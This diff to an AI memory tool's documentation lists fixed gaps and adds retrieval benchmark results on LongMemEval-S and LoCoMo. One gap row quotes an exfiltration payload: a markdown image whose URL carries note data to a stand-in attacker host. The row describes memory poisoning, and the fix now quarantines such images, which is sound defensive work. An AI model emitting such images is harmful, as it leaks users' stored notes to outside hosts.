@@ -467,3 +467,18 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 | `GAP-REST-CAS` | The REST `PUT /notes/:id` ignored `if_rev`. | **Fixed in 1.5.0**: it takes `if_rev` and answers 409. | B16 (passes) |
 | `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
 | `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
+
+**Round 1 retrieval changes, 2026-11-05 (no change in these numbers).** The session-start context now uses one
+any-keyword search instead of one per keyword; "how many / total / every / list all" questions return twice the
+results with a soft cap of two per capture session or source; MCP search and read results carry a `when` field
+("2023-05-08, 5 months ago"). Same commands, keyword mode, same PC, before and after:
+
+| Dataset | R@5 | R@10 | Rall@10 | nDCG@10 | MRR |
+|---|---|---|---|---|---|
+| LongMemEval-S session, keyword, before / after | 97.0 / 97.0 | 98.3 / 98.3 | 90.2 / 90.2 | 89.8 / 89.8 | 91.0 / 91.0 |
+| LoCoMo-10 turn, keyword, before / after | 58.2 / 58.2 | 65.8 / 65.8 | 56.9 / 56.9 | 48.4 / 48.3 | 47.0 / 46.9 |
+
+The benchmark notes carry no capture session or source, so the per-session cap and the date field are not exercised
+here; they are covered by unit tests. The session-start change is not a benchmark path either. LoCoMo was also used
+to tune the 11-04 session-neighbour weight, so its numbers are not a held-out test. No end-to-end answer accuracy was
+re-measured in this round.
